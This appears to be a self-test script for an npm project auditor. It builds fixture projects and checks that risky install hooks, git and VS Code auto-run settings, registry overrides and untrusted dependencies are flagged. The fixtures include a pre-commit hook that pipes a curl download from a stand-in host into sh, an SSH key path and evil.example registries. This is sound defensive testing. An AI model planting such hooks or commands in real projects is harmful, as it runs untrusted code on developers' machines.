// Self test: builds tiny fixture projects in a temp folder and checks audit results.
const { spawnSync } = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "audit-test-"));
const write = (rel, text) => {
  const p = path.join(tmp, rel);
  fs.mkdirSync(path.dirname(p), { recursive: true });
  fs.writeFileSync(p, text);
};

write("clean/package.json", JSON.stringify({ name: "clean", scripts: { test: "node index.js" } }));
write("clean/index.js", 'console.log("hello");\n');

write("bad/package.json", JSON.stringify({ name: "bad", scripts: { postinstall: "node setup.js" } }));
write("bad/setup.js", [
  'const cp = require("child_process");',
  'const payload = Buffer.from("aGVsbG8=", "base64").toString();',
  'const where = "~/.ssh/id_rsa";',
  "console.log(payload, where, typeof cp);",
].join("\n"));

// Git hooks fixture (v1.1.0 feature)
write("githook/.git/hooks/pre-commit", "#!/bin/sh\ncurl -s https://example.com/x | sh\n");
write("githook/package.json", JSON.stringify({ name: "githook" }));

// Git config fixture (v1.1.0 feature)
write("gitcfg/.git/config", '[core]\n\thooksPath = .hooks\n\tfsmonitor = evil-bin\n');
write("gitcfg/package.json", JSON.stringify({ name: "gitcfg" }));

// VS Code task fixture (v1.1.0 feature)
write("vscodepad/.vscode/tasks.json", JSON.stringify({ tasks: [{ runOptions: { runOn: "folderOpen" } }] }));
write("vscodepad/package.json", JSON.stringify({ name: "vscodepad" }));

// TypeScript fixtures (PR #4 feature)
write("ts-bad/package.json", JSON.stringify({ name: "ts-bad", scripts: { test: "tsc" } }));
write("ts-bad/src/setup.ts", 'import { execSync } from "child_process";\nexecSync("echo hi");\n');
write("ts-bad/src/helper.mts", 'const x = eval("1+1");\n');
write("ts-bad/src/Panel.tsx", 'const run = new Function("return 1");\nexport const Panel = () => null;\n');
write("ts-bad/src/types.cts", '// plain type-only file, safe\nexport type Foo = string;\n');

write("ts-clean/package.json", JSON.stringify({ name: "ts-clean" }));
write("ts-clean/src/index.ts", 'export const greet = (name: string) => `Hello, ${name}`;\n');

// Project npm configuration can change which programs or scripts npm runs.
const npmrcSettings = [
  ["script-shell", "./project-shell", "script-shell selects the program npm uses to run scripts"],
  ["ignore-scripts", "false", "ignore-scripts=false explicitly enables npm lifecycle scripts"],
  ["node-options", "--require=./project-bootstrap.cjs", "node-options passes options to Node.js lifecycle processes"],
  ["init-module", "./project-init.cjs", "init-module selects the module npm init loads"],
];
for (const [key, value] of npmrcSettings) write("npmrc-" + key + "/.npmrc", key + "=" + value + "\n");
const npmrcMarker = path.join(tmp, "npmrc-module-executed");
for (const [dir, file] of [["node-options", "project-bootstrap.cjs"], ["init-module", "project-init.cjs"]]) {
  write("npmrc-" + dir + "/" + file, 'require("fs").writeFileSync(' + JSON.stringify(npmrcMarker) + ', "executed");\n');
}
write("npmrc-boundary/.npmrc", '  ignore-scripts = "false" ; explicit override\r\nscript-shell = "./custom shell" # custom shell\r\n');
write("npmrc-safe/.npmrc", "# script-shell=ignored\n; node-options=ignored\n# init-module=ignored\n; ignore-scripts=false\nignore-scripts=true\nnode-options=\ninit-module=\"\"\nscript-shell=''\nscript-shell-example=ignored\nignore-scripts=falsehood\n");
write("npmrc-yarn/.yarnrc", "script-shell=ignored\nignore-scripts=false\nnode-options=ignored\ninit-module=ignored\n");
write("npmrc-yarn/.yarnrc.yml", "script-shell=ignored\nignore-scripts=false\nnode-options=ignored\ninit-module=ignored\n");
write("npmrc-mixed/.npmrc", "node-options=--require=./project-bootstrap.cjs\n//registry.npmjs.org/:_authToken=npm_SECRET789\n@acme:registry=https://npm.evil.example/\n");

// Registry config fixtures (v1.3.0): a token or a private registry in the project
write("npmrc-bad/package.json", JSON.stringify({ name: "npmrc-bad" }));
write("npmrc-bad/frontend/.npmrc", "//registry.npmjs.org/:_authToken=npm_SECRET123\n@acme:registry=https://npm.evil.example/\n");
write("npmrc-bad/.yarnrc.yml", 'npmRegistryServer: "https://yarn.evil.example"\n');
write("npmrc-ok/package.json", JSON.stringify({ name: "npmrc-ok" }));
write("npmrc-ok/.npmrc", "registry=https://registry.npmjs.org/\nsave-exact=true\n");

// pnpm hook files run during install even without a package.json install script.
const pnpmMarker = path.join(tmp, "pnpm-hook-executed");
write("pnpm-hook/.pnpmfile.cjs", 'require("fs").writeFileSync(' + JSON.stringify(pnpmMarker) + ', "executed");\nmodule.exports = { hooks: {} };\n');
write("pnpm-risky/.pnpmfile.cjs", 'const cp = require("child_process");\nmodule.exports = { hooks: {} };\n');
write("pnpm-empty/.pnpmfile.cjs", "");
write("pnpm-lookalike/pnpmfile.cjs", 'module.exports = {};\n');
write("pnpm-lookalike/.pnpmfile.cjs/index.js", 'module.exports = {};\n');

// Non-registry dependency fixtures (PR #4 feature)
write(
  "git-dep/package.json",
  JSON.stringify({
    name: "git-dep",
    dependencies: {
      "safe-pkg": "^1.0.0",
      "risky-git": "git+https://github.com/attacker/pkg.git",
      "risky-tgz": "https://example.com/pkg.tgz",
      "local-hack": "file:../internal",
      "risky-gitproto": "git://github.com/attacker/pkg.git",
      "risky-shorthand": "attacker/pkg#main",
      "risky-link": "link:../linked",
      "risky-url": "https://example.com/download?id=1",
      "scoped-safe": "~2.3.0",
      "tag-safe": "latest",
    },
  })
);

// Yarn can replace the installed binary with a project-local file.
const yarnMarker = path.join(tmp, "yarn-binary-executed");
const yarnBinary = ".yarn/releases/yarn-fixture.cjs";
write("yarn-path/.yarnrc.yml", "yarnPath: " + yarnBinary + "\n");
write("yarn-path/" + yarnBinary, 'require("fs").writeFileSync(' + JSON.stringify(yarnMarker) + ', "executed");\n');
write("yarn-quotes/.yarnrc.yml", 'yarnPath: ".yarn/releases/yarn custom.cjs" # project binary\n');
write("yarn-single/.yarnrc.yml", "yarnPath: '.yarn/releases/yarn#custom.cjs'\n");
write("yarn-comment/.yarnrc.yml", "yarnPath: .yarn/releases/yarn.cjs # project binary\n");
write("yarn-none/.yarnrc.yml", "# yarnPath: ignored.cjs\n; yarnPath: ignored.cjs\notherYarnPath: ignored.cjs\nyarnPath: null\n");
write("yarn-none/.npmrc", "yarnPath=ignored.cjs\n");
write("yarn-none/.yarnrc", "yarnPath: ignored.cjs\n");
write("yarn-none/.yarnrc.yml.example", "yarnPath: ignored.cjs\n");
write("yarn-empty/.yarnrc.yml", "yarnPath: # no binary configured\n");
write("yarn-mixed/.yarnrc.yml", 'yarnPath: ".yarn/releases/yarn.cjs"\nnpmAuthToken: npm_SECRET456\nnpmRegistryServer: "https://yarn.evil.example"\n');

// Bun can load scripts before running project files or tests.
const bunMarker = path.join(tmp, "bun-preload-executed");
write("bun-preload/packages/app/bunfig.toml", [
  'preload = ["./runtime.js"]',
  '[ "test" ] # test scripts ]',
  "'preload' = [",
  '  "./setup #1].js", # "./not-a-path.js"',
  "  './test,helper.js',",
  '  "./control\u009b\\n.js",',
  "]",
  "[install]",
  'preload = ["./ignored.js"]',
].join("\r\n"));
write("bun-preload/packages/app/runtime.js", 'require("fs").writeFileSync(' + JSON.stringify(bunMarker) + ', "executed");\n');
write("bun-preload-scalar/bunfig.toml", 'preload = "./runtime.js"\ntest.preload = "./setup.js"\n');
write("bun-preload-clean/bunfig.toml", [
  '# preload = ["./comment.js"]',
  "preload = []",
  'example = """',
  "[test]",
  'preload = ["./inside-a-string.js"]',
  '"""',
  "[install]",
  'preload = ["./install.js"]',
  "[test.reporters]",
  'preload = ["./reporter.js"]',
].join("\n"));
write("bun-preload-clean/bunfig.toml.example", 'preload = ["./example.js"]\n');
write("bun-preload-clean/node_modules/pkg/bunfig.toml", 'preload = ["./dependency.js"]\n');

const run = (dir, extra = []) =>
  spawnSync(process.execPath, [path.join(__dirname, "audit.js"), ...extra, dir], { encoding: "utf8" });

let ok = true;
const check = (name, cond) => {
  console.log((cond ? "PASS " : "FAIL ") + name);
  if (!cond) ok = false;
};

// Version check (v1.1.0)
const v = spawnSync(process.execPath, [path.join(__dirname, "audit.js"), "--version"], { encoding: "utf8" });
check("--version prints version", v.status === 0 && /npm-install-audit 1\.4\.0/.test(v.stdout));

// Original checks
const clean = run(path.join(tmp, "clean"));
check("clean fixture exits 0", clean.status === 0);

const bad = run(path.join(tmp, "bad"));
check("bad fixture exits 1", bad.status === 1);
check("flags postinstall hook", /postinstall hook runs/.test(bad.stdout));
check("flags shell execution", /runs shell commands/.test(bad.stdout));
check("flags base64 decoding", /decodes base64/.test(bad.stdout));
check("flags key paths", /key, wallet or browser data paths/.test(bad.stdout));
check("missing directory exits 2", run(path.join(tmp, "nope")).status === 2);

// v1.1.0 checks: git hooks, git config, VS Code
const gh = run(path.join(tmp, "githook"));
check("flags active git hook with payload", /active git hook.*downloads and runs code/.test(gh.stdout));

const gc = run(path.join(tmp, "gitcfg"));
check("flags hooksPath in git config", /hooksPath points git hooks/.test(gc.stdout));
check("flags fsmonitor in git config", /fsmonitor runs a program/.test(gc.stdout));

const vc = run(path.join(tmp, "vscodepad"));
check("flags VS Code folderOpen task", /VS Code task runs when the folder is opened/.test(vc.stdout));

// PR #4: TypeScript checks
const tsBad = run(path.join(tmp, "ts-bad"));
check("ts-bad fixture exits 1", tsBad.status === 1);
check("flags .ts exec in ts file", /runs shell commands/.test(tsBad.stdout));
check("flags eval in .mts file", /evaluates code at runtime/.test(tsBad.stdout));
check("scans .tsx files", /Panel\.tsx/.test(tsBad.stdout));

const tsClean = run(path.join(tmp, "ts-clean"));
check("ts-clean fixture exits 0", tsClean.status === 0);

// PR #4: Non-registry dependency checks
const gitDep = run(path.join(tmp, "git-dep"));
check("git-dep fixture exits 1", gitDep.status === 1);
check("flags git+https dep", /git URL dependency/.test(gitDep.stdout));
check("flags tarball URL dep", /tarball URL dependency/.test(gitDep.stdout));
check("flags file: dep", /local file: dependency/.test(gitDep.stdout));
check("does not flag safe semver", !gitDep.stdout.includes('"safe-pkg"'));
check("flags git:// dep", /git:\/\/ URL dependency/.test(gitDep.stdout));
check("flags bare user/repo dep", /bare user\/repo GitHub dependency/.test(gitDep.stdout));
check("flags link: dep", /local link: dependency/.test(gitDep.stdout));
check("flags non-tarball URL dep", /"risky-url".*URL dependency/.test(gitDep.stdout));
check("does not flag ~range or dist-tag", !/"scoped-safe"|"tag-safe"/.test(gitDep.stdout));

for (const [key, , message] of npmrcSettings) {
  const result = run(path.join(tmp, "npmrc-" + key));
  check(key + " override exits 1", result.status === 1);
  check("flags " + key + " override in text output", result.stdout.includes(".npmrc: " + message));
  const json = run(path.join(tmp, "npmrc-" + key), ["--json"]);
  const findings = JSON.parse(json.stdout);
  check("--json reports " + key + " override", json.status === 1 && findings.length === 1 && findings[0].file === ".npmrc" && findings[0].rule === message);
}
const npmrcBoundary = JSON.parse(run(path.join(tmp, "npmrc-boundary"), ["--json"]).stdout);
check("handles quoted npmrc values, comments, spacing and CRLF", npmrcBoundary.length === 2 && npmrcBoundary.some((f) => f.rule.includes("ignore-scripts=false")) && npmrcBoundary.some((f) => f.rule.startsWith("script-shell ")));
check("ignores safe, empty, commented and lookalike npmrc settings", run(path.join(tmp, "npmrc-safe")).status === 0);
check("does not apply npm-only settings to Yarn configs", run(path.join(tmp, "npmrc-yarn")).status === 0);
const npmrcMixed = run(path.join(tmp, "npmrc-mixed"));
check("keeps registry and token findings alongside npm overrides", /node-options passes options/.test(npmrcMixed.stdout) && /ships a registry auth token/.test(npmrcMixed.stdout) && /@acme packages install from another registry/.test(npmrcMixed.stdout));
check("still redacts tokens alongside npm overrides", !npmrcMixed.stdout.includes("SECRET789"));
check("does not execute modules referenced by npmrc settings", !fs.existsSync(npmrcMarker));

// PR #4: --json flag checks
const npmrcBad = run(path.join(tmp, "npmrc-bad"));
check("npmrc-bad fixture exits 1", npmrcBad.status === 1);
check("flags auth token in .npmrc", /frontend[\\/]\.npmrc: ships a registry auth token/.test(npmrcBad.stdout));
check("does not print the token", !/SECRET123/.test(npmrcBad.stdout));
check("flags scoped private registry", /@acme packages install from another registry: https:\/\/npm\.evil\.example/.test(npmrcBad.stdout));
check("flags yarn registry server", /\.yarnrc\.yml: installs come from another registry: https:\/\/yarn\.evil\.example/.test(npmrcBad.stdout));
const npmrcOk = run(path.join(tmp, "npmrc-ok"));
check("official registry in .npmrc is not flagged", npmrcOk.status === 0);

const pnpmHook = run(path.join(tmp, "pnpm-hook"));
check("pnpm hook fixture exits 1", pnpmHook.status === 1);
check("flags inert pnpm hook file", /\.pnpmfile\.cjs: pnpm hook file runs automatically during pnpm install/.test(pnpmHook.stdout));
check("does not execute the pnpm hook file", !fs.existsSync(pnpmMarker));
check("flags empty pnpm hook file", run(path.join(tmp, "pnpm-empty")).status === 1);
check("does not flag pnpm filename or directory lookalikes", run(path.join(tmp, "pnpm-lookalike")).status === 0);
const pnpmRisky = run(path.join(tmp, "pnpm-risky"));
check("still scans pnpm hook source for risky patterns", /\.pnpmfile\.cjs: runs shell commands/.test(pnpmRisky.stdout));
const pnpmJson = run(path.join(tmp, "pnpm-hook"), ["--json"]);
const pnpmFindings = JSON.parse(pnpmJson.stdout);
check("--json pnpm hook exits 1", pnpmJson.status === 1);
check("--json includes pnpm hook finding", pnpmFindings.length === 1 && pnpmFindings[0].file === ".pnpmfile.cjs" && /pnpm hook file/.test(pnpmFindings[0].rule));
check("--json does not execute the pnpm hook file", !fs.existsSync(pnpmMarker));

const jsonClean = run(path.join(tmp, "clean"), ["--json"]);
check("--json clean exits 0", jsonClean.status === 0);
check("--json clean is valid JSON", (() => { try { JSON.parse(jsonClean.stdout); return true; } catch { return false; } })());
check("--json clean is empty array", JSON.parse(jsonClean.stdout).length === 0);

const jsonBad = run(path.join(tmp, "bad"), ["--json"]);
check("--json bad exits 1", jsonBad.status === 1);
const parsed = (() => { try { return JSON.parse(jsonBad.stdout); } catch { return null; } })();
check("--json bad is valid JSON", parsed !== null);
check("--json findings have file", parsed && parsed.every((f) => typeof f.file === "string"));
check("--json findings have rule", parsed && parsed.every((f) => typeof f.rule === "string"));
check("--json findings have message", parsed && parsed.every((f) => typeof f.message === "string"));

const yarnPath = run(path.join(tmp, "yarn-path"));
check("yarnPath fixture exits 1", yarnPath.status === 1);
check("flags Yarn binary path in text output", yarnPath.stdout.includes(".yarnrc.yml: yarnPath configures Yarn to run a project binary: " + yarnBinary));
check("does not execute the configured Yarn binary", !fs.existsSync(yarnMarker));
const yarnJson = run(path.join(tmp, "yarn-path"), ["--json"]);
const yarnFindings = JSON.parse(yarnJson.stdout);
check("--json yarnPath exits 1", yarnJson.status === 1);
check("--json includes the configured Yarn binary", yarnFindings.length === 1 && yarnFindings[0].file === ".yarnrc.yml" && yarnFindings[0].rule === "yarnPath configures Yarn to run a project binary: " + yarnBinary);
check("--json does not execute the configured Yarn binary", !fs.existsSync(yarnMarker));
const yarnQuoted = JSON.parse(run(path.join(tmp, "yarn-quotes"), ["--json"]).stdout);
check("keeps spaces in a quoted Yarn binary path", yarnQuoted.length === 1 && yarnQuoted[0].rule.endsWith(".yarn/releases/yarn custom.cjs"));
const yarnSingle = JSON.parse(run(path.join(tmp, "yarn-single"), ["--json"]).stdout);
check("keeps hash characters inside a quoted Yarn binary path", yarnSingle.length === 1 && yarnSingle[0].rule.endsWith(".yarn/releases/yarn#custom.cjs"));
const yarnComment = JSON.parse(run(path.join(tmp, "yarn-comment"), ["--json"]).stdout);
check("omits trailing comments from a Yarn binary path", yarnComment.length === 1 && yarnComment[0].rule.endsWith(".yarn/releases/yarn.cjs"));
check("ignores commented, null and lookalike yarnPath settings", run(path.join(tmp, "yarn-none")).status === 0);
check("ignores an empty yarnPath setting", run(path.join(tmp, "yarn-empty")).status === 0);
const yarnMixed = run(path.join(tmp, "yarn-mixed"));
check("still flags Yarn registry settings alongside yarnPath", /yarnPath configures Yarn/.test(yarnMixed.stdout) && /ships a registry auth token/.test(yarnMixed.stdout) && /installs come from another registry/.test(yarnMixed.stdout));
check("still redacts Yarn registry tokens alongside yarnPath", !yarnMixed.stdout.includes("SECRET456"));

const bun = run(path.join(tmp, "bun-preload"));
const bunFile = path.join("packages", "app", "bunfig.toml");
const bunRule = 'preload configures Bun to run scripts automatically: "./runtime.js"';
const bunTestRule = '[test] preload configures Bun to run scripts automatically: "./setup #1].js", \'./test,helper.js\', "./control\\u009b\\n.js"';
check("Bun preload fixture exits 1", bun.status === 1);
check("flags Bun runtime and test preloads with their paths", bun.stdout.includes(bunFile + ": " + bunRule + "\n") && bun.stdout.includes(bunFile + ": " + bunTestRule + "\n"));
const bunJson = run(path.join(tmp, "bun-preload"), ["--json"]);
const bunFindings = JSON.parse(bunJson.stdout);
check("--json includes only the Bun runtime and test findings", bunJson.status === 1 && bunFindings.length === 2 && bunFindings.every((finding) => finding.file === bunFile) && bunFindings[0].rule === bunRule && bunFindings[1].rule === bunTestRule);
check("does not execute the configured Bun preload scripts", !fs.existsSync(bunMarker));
const bunScalar = run(path.join(tmp, "bun-preload-scalar"));
check("flags scalar Bun preloads and dotted test settings", bunScalar.status === 1 && bunScalar.stdout.includes(bunRule + "\n") && bunScalar.stdout.includes('[test] preload configures Bun to run scripts automatically: "./setup.js"\n'));
check("ignores empty, commented, unrelated and dependency Bun preloads", run(path.join(tmp, "bun-preload-clean")).status === 0);

fs.rmSync(tmp, { recursive: true, force: true });
process.exit(ok ? 0 : 1);
